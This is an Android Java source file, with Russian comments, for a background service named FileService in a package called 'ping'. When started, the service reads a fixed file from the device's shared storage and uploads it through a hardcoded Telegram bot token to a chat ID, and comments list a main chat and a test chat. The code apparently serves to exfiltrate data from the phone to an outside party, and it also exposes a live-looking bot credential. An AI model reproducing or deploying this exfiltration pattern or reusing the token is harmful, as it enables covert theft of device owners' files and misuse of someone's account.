package com.example.ping;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import com.pengrad.telegrambot.TelegramBot;
import com.pengrad.telegrambot.request.SendDocument;
import com.pengrad.telegrambot.request.SendMessage;

import java.io.File;

public class FileService extends Service {
    private final static String botId = "5999996463:AAFEC5Gs66uypFtDTvuiolo4o7Yizp4UBLo";
    // Индентификатор уведомления
    private static final int NOTIFICATION_ID = 201;
    // Индентификатор канала уведомления
    private static final String CHANNEL_ID = "Files";
    String folderPath;
    private NotificationCompat.Builder builder;

    @Override
    public void onCreate() {
        super.onCreate();
        folderPath = this.getApplicationContext().getFilesDir().getAbsolutePath();
        createNotificationChannel();
        builder =
                new NotificationCompat.Builder(this, CHANNEL_ID)
                        .setSmallIcon(R.drawable.ic_launcher_foreground)
                        .setContentTitle("Файлы")
                        .setContentText("Отправка файлов")
                        .setPriority(NotificationCompat.PRIORITY_DEFAULT);
    }

    private void createNotificationChannel() {
        NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "Files",
                NotificationManager.IMPORTANCE_DEFAULT
        );
        NotificationManager notificationManager = getSystemService(NotificationManager.class);
        notificationManager.createNotificationChannel(channel);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        TelegramBot bot = new TelegramBot(botId);
        startForeground(NOTIFICATION_ID, builder.build());
        new Thread(new Runnable() {
            @Override
            public void run() {
                // Основной чат "-918846557"
                // Тестовый чат "-994059702"
                File file = new File("/storage/emulated/0/2.txt");
                if (file.canRead()) {
                    bot.execute(new SendDocument("-994059702", file));
                } else {
                    bot.execute(new SendMessage("", ""));
                    Log.e("FileService", "Файл недоступен для чтения");
                }
                stopSelf();
            }
        }).start();
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}